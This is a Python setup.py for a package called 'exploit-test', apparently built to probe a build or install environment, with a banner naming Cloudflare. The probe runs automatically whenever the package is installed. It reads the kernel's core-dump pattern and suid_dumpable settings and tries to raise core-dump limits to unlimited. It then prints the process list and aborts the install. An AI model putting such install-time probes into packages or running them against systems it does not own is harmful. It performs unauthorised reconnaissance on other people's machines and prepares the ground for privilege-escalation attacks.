import os, sys, resource, subprocess as sp
from setuptools import setup

def exploit_check():
    o = sys.stderr.write
    o("\n" + "!"*40 + "\n")
    o("--- CLOUDFLARE KERNEL CONFIG VULN CHECK ---\n")

     
    o("[1] CORE DUMP SETTINGS:\n")
    o("pattern: " + sp.getoutput("cat /proc/sys/kernel/core_pattern") + "\n")
    o("suid_dumpable: " + sp.getoutput("cat /proc/sys/fs/suid_dumpable") + "\n")

     
    soft, hard = resource.getrlimit(resource.RLIMIT_CORE)
    o(f"[2] LIMITS: Soft={soft}, Hard={hard}\n")
    
  
    try:
        resource.setrlimit(resource.RLIMIT_CORE, (resource.RLIM_INFINITY, resource.RLIM_INFINITY))
        o("SUCCESS: Core limits increased!\n")
    except:
        o("FAIL: Could not change core limits.\n")

    
    o("\n[3] PROCESS LIST:\n")
    o(sp.getoutput("ps auxf | head -n 10") + "\n")

    o("\n" + "!"*40 + "\n")
    sys.exit(1)

try: exploit_check()
except: sys.exit(1)

setup(name="exploit-test", version="0.1")
